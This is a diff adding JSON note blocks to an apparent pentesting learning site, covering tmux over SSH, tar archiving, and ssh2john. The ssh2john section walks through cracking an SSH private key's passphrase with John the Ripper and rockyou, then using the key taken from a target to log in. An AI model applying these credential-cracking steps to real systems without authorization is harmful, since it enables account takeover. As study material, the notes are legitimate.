+        "type": "section_heading",
+        "id": "tmux-workflow",
+        "text": "Persistent tmux SSH Workflow"
+      },
+      {
+        "type": "text_block",
+        "id": "tmux-step-1",
+        "text": "1. Connect via SSH: ssh -i id_rsa john@target_ip"
+      },
+      {
+        "type": "text_block",
+        "id": "tmux-step-2",
+        "text": "2. Start tmux: tmux new -s lab"
+      },
+      {
+        "type": "text_block",
+        "id": "tmux-step-3",
+        "text": "3. Run commands inside tmux. SSH hanging won’t terminate your work."
+      },
+      {
+        "type": "text_block",
+        "id": "tmux-step-4",
+        "text": "4. Detach: Press Ctrl+b then d"
+      },
+      {
+        "type": "text_block",
+        "id": "tmux-step-5",
+        "text": "5. Reattach later: tmux attach -t lab"
+      },
+      {
+        "type": "text_block",
+        "id": "tmux-step-6",
+        "text": "6. Nested SSH inside tmux: use ssh -t user@target_ip to force a TTY allocation"
+      },
+      {
+        "type": "section_heading",
+        "id": "tmux-commands",
+        "text": "tmux Commands for SSH Sessions"
+      },
+      {
+        "type": "code_block",
+        "id": "tmux-commands-list",
+        "language": "bash",
+        "code": "# Start a new tmux session named 'lab'\ntmux new -s lab\n\n# Detach from the session (keep it running)\n# Press Ctrl+b then d\n\n# List active tmux sessions\ntmux ls\n\n# Reattach to a session\ntmux attach -t lab\n\n# Kill a session\ntmux kill-session -t lab"
+      },
+      {
+        "type": "order_block",
+        "id": "tmux-commands-explain",
+        "text": "These are the basic tmux commands for managing persistent SSH sessions. Use them to start, detach, reattach, list, and kill tmux sessions to prevent SSH hangs from interrupting your work."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh-tmux-issue",
+        "text": "Issue: SSH Inside tmux Requires TTY"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-tmux-issue-explain",
+        "text": "When SSH is executed inside a tmux session, the remote system may not receive a proper pseudo-terminal (TTY). This can cause SSH sessions to hang, interactive commands to fail, or shells to behave incorrectly."
+      },
+      {
+        "type": "code_block",
+        "id": "ssh-tmux-command",
+        "language": "bash",
+        "code": "ssh -t user@target_ip"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh-tmux-analysis",
+        "text": "The -t option forces SSH to allocate a pseudo-terminal (TTY). This resolves issues when running SSH inside tmux or when remote commands require an interactive terminal."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh-summary",
+        "text": "SSH Troubleshooting Checklist"
+      }
+    ]
+  },
+  {
+    "id": 18,
+    "slug": "tar",
+    "title": "TAR",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Compression-Utilities/tar.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "tar-intro",
+        "text": "TAR Archiving Utility"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-definition",
+        "text": "<highlight>tar</highlight> (tape archive) is a Linux utility used to combine multiple files and directories into a single archive file. It is commonly used for <highlight>backup, transfer, and packaging</highlight> of files on Linux systems."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-create",
+        "text": "Creating a tar Archive"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-create-command",
+        "language": "bash",
+        "code": "tar -cvf archive.tar folder1 file1"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-create-analysis",
+        "text": "The command creates an archive named <highlight>archive.tar</highlight> containing the specified files and directories."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-list",
+        "text": "Listing Archive Contents"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-list-command",
+        "language": "bash",
+        "code": "tar -tvf archive.tar"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-list-analysis",
+        "text": "The <highlight>-t</highlight> flag lists all files stored inside the archive without extracting them."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-extract",
+        "text": "Extracting Files from Archive"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-extract-command",
+        "language": "bash",
+        "code": "tar -xvf archive.tar"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-extract-analysis",
+        "text": "This extracts all files from <highlight>archive.tar</highlight> into the current directory."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-compression",
+        "text": "Creating Compressed tar Archives"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-gzip-command",
+        "language": "bash",
+        "code": "tar -czvf archive.tar.gz folder1"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-bzip-command",
+        "language": "bash",
+        "code": "tar -cjvf archive.tar.bz2 folder1"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-xz-command",
+        "language": "bash",
+        "code": "tar -cJvf archive.tar.xz folder1"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-compression-analysis",
+        "text": "tar archives can be compressed using different algorithms such as <highlight>gzip, bzip2, and xz</highlight> to reduce file size."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-extract-compressed",
+        "text": "Extracting Compressed tar Archives"
+      },
+      {
+        "type": "code_block",
+        "id": "extract-gzip-command",
+        "language": "bash",
+        "code": "tar -xzvf archive.tar.gz"
+      },
+      {
+        "type": "code_block",
+        "id": "extract-bzip-command",
+        "language": "bash",
+        "code": "tar -xjvf archive.tar.bz2"
+      },
+      {
+        "type": "code_block",
+        "id": "extract-xz-command",
+        "language": "bash",
+        "code": "tar -xJvf archive.tar.xz"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-extract-compressed-analysis",
+        "text": "The extraction command must include the matching compression flag used during archive creation."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-common-flags",
+        "text": "Common tar Flags"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-flags-table",
+        "language": "text",
+        "code": "Flag   Purpose\n-----------------------------\n-c     Create archive\n-x     Extract archive\n-t     List archive contents\n-v     Verbose output\n-f     Specify archive file\n-z     Use gzip compression\n-j     Use bzip2 compression\n-J     Use xz compression"
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-summary",
+        "text": "Summary"
+      },
+      {
+        "type": "explanation",
+        "id": "tar-summary-steps",
+        "title": "Typical tar Workflow",
+        "items": [
+          "Collect files or directories to archive",
+          "Create tar archive using tar -cvf",
+          "Optionally compress archive with gzip, bzip2, or xz",
+          "Transfer or store the archive",
+          "Extract files later using tar -xvf"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 19,
+    "slug": "ssh2john",
+    "title": "ssh2john",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/Pentesting-tools/ssh2john.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "ssh2john-intro",
+        "text": "ssh2john: Cracking SSH Private Keys"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh2john-definition",
+        "text": "<highlight>ssh2john</highlight> is a tool from the <highlight>John the Ripper</highlight> suite that converts SSH private keys into a format that John can use for password cracking. It is used to test the strength of passphrases protecting private keys."
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh2john-usage",
+        "text": "Basic Usage"
+      },
+      {
+        "type": "code_block",
+        "id": "ssh2john-command",
+        "language": "bash",
+        "code": "python3 ssh2john.py id_rsa > id_rsa.hash"
+      },
+      {
+        "type": "order_block",
+        "id": "ssh2john-analysis",
+        "text": "This command converts the private key <highlight>id_rsa</highlight> into a hash format suitable for John the Ripper and saves it in <highlight>id_rsa.hash</highlight>."
+      },
+      {
+        "type": "output_block",
+        "id": "ssh2john-output",
+        "language": "bash",
+        "code": "id_rsa:$sshng$6$16$abcdef1234567890$1200$..."
+      },
+      {
+        "type": "section_heading",
+        "id": "john-crack",
+        "text": "Cracking the SSH Key"
+      },
+      {
+        "type": "code_block",
+        "id": "john-crack-command",
+        "language": "bash",
+        "code": "john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash"
+      },
+      {
+        "type": "order_block",
+        "id": "john-crack-analysis",
+        "text": "<highlight>John the Ripper</highlight> attempts to recover the passphrase protecting the SSH private key using a wordlist."
+      },
+      {
+        "type": "output_block",
+        "id": "john-crack-output",
+        "language": "bash",
+        "code": "secret123        (id_rsa)"
+      },
+      {
+        "type": "section_heading",
+        "id": "ssh2john-summary",
+        "text": "Summary"
+      },
+      {
+        "type": "explanation",
+        "id": "ssh2john-steps",
+        "title": "Typical Workflow for ssh2john",
+        "items": [
+          "Obtain the SSH private key from the target system",
+          "Convert the key using ssh2john.py into John compatible format",
+          "Run John the Ripper with a wordlist against the hash",
+          "Recover the passphrase protecting the SSH key",
+          "Use the unlocked private key to authenticate via SSH"
+        ]
+      }
+    ]
   }
 ]
